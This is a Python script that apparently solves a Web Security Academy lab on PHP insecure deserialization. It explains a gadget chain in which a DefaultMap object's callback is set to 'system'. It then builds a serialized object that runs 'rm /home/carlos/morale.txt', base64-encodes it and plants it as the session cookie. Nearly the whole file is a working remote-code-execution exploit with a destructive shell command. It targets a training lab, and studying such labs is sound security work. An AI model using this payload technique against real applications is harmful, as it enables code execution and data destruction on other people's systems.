from web_security_academy.core.logger import logger
from urllib.parse import quote
from base64 import b64encode


def solve_lab(session):
    logger.info("Source code found at /cgi-bin/libs/CustomTemplate.php~")

    # Explanation: When deserialized, a CustomTemplate object constructs an Product object with its $default_desc_type
    # and $desc fields. The Product constructor has $desc get the $default_desc_type property. Additionally, when a
    # DefaultMap object gets a property, it passes the property to its $callback field. Therefore, we can create a
    # DefaultMap object with "system" as the $callback, and set this as the $desc field of a CustomTemplate object.
    # Then, when the CustomTemplate object is deserialized, the $default_desc_type will be passed to the `system`
    # function. We can set $default_desc_type to be "rm /home/carlos/morale.txt" to solve the lab.

    serial = (
        'O:14:"CustomTemplate":2:{s:33:"\x00CustomTemplate\x00default_desc_type";s:26:"rm /home/carlos/morale.txt";'
        's:20:"\x00CustomTemplate\x00desc";O:10:"DefaultMap":1:{s:20:"\x00DefaultMap\x00callback";s:6:"system";}}'
    )
    cookie = b64encode(serial.encode())
    session.cookies.set("session", quote(cookie.decode()))
    session.get_path("/")

    logger.info("Embedded the following serialized object as session cookie:")
    logger.info(serial.encode())
